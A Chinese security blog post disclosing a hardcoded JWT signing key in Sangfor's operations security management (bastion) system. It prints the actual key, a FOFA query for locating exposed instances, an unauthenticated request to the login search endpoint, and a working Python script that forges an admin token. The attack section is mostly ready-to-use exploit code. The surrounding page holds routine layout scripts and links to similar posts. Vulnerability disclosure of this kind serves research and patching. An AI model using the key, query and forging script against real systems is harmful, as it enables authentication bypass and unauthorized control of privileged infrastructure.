---
title: "深信服运维安全管理系统 Jwt 密钥硬编码"
source: https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html
asset_dir: assets/深信服运维安全管理系统-jwt-密钥硬编码
---

# 深信服运维安全管理系统 Jwt 密钥硬编码

[Mrxn](https://mrxn.net/author/1)* 发表于2026/3/5 08:41
* 341浏览
* [0评论](#comment)
* 9分钟阅读

深入探索

身份验证

软件

鉴权


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

深信服运维安全管理系统存在 Jwt 密钥硬编码[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。攻击者可通过分析应用程序代码或通过其他方式获取硬编码的 Jwt 密钥，利用该密钥伪造 Jwt Token，从而绕过身份认证机制，实现未授权访问系统功能或敏感信息，可能导致越权操作、[数据泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)等严重后果。

安全研究工具

# 影响版本

低于 3.0.12 20241106

# fofa语法

> body="/fort/login" && header="FORTSESSIONID"

# 漏洞分析

起因是在测试 `/login/search_login`接口时，

[![深信服运维安全管理系统 Jwt 密钥硬编码](images/img-001-1d9bc6eb20c7.webp)](https://image.mrxn.net/ce116caf15684171b8d07d4066b99095.webp)

发现有Jwt签名部分，跟进两个方法看了下，发现硬编码的Jwt密钥

漏洞扫描服务

深入探索

SQL注入检测工具

安全研究报告

文件大小转换

[![深信服运维安全管理系统 Jwt 密钥硬编码](images/img-002-59b6606af699.webp)](https://image.mrxn.net/5a87e37bb75440ceb4035292729c3825.webp)

Jwt硬编码密钥为 `69fad654821b991725e62fb65ee464da`

深入探索

安全工具开发

企业安全咨询

文本剥离工具

# 漏洞复现

[![深信服运维安全管理系统 Jwt 密钥硬编码](images/img-003-95edf58edb9c.webp)](https://image.mrxn.net/4c6f5f6e3a4f4370a520ceda847556a4.webp)

## POC

> [未授权](https://mrxn.net/tag/%E6%9C%AA%E6%8E%88%E6%9D%83)获取actionToken、accessToken
>
> 网络安全

```
GET /fort/login/search_login HTTP/1.1
Host: sangfor_osm.mrxn.net
```

伪造合法的Jwt签名token

> 伪造一个登录用户名 admin

```
import jwt
import time

# 从代码中获取的硬编码密钥
SECRET_KEY = "69fad654821b991725e62fb65ee464da"

# 伪造的用户信息
payload = {
    "loginName": "admin",
    "userId": "1000000000001",
    "exp": int(time.time()) + 43200  # 设置一个未来的过期时间
}

# JWT Header
headers = {
  "typ": "JWT",
  "alg": "HS256"
}

# 使用获取的密钥签名，生成伪造的token
forged_token = jwt.encode(payload, SECRET_KEY, algorithm="HS256", headers=headers)

print(forged_token)
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#未授权](https://mrxn.net/tag/%E6%9C%AA%E6%8E%88%E6%9D%83)
* [#泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.POC](#toc-5-1-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)  
文章链接：<https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

漏洞扫描服务

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sangfor\_osm-login-search\_login-token-leak.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 plus\_get\_favicon 任意文件上传漏洞](https://mrxn.net/jswz/bigant-plus_get_favicon-upload.html)

安全研究工具

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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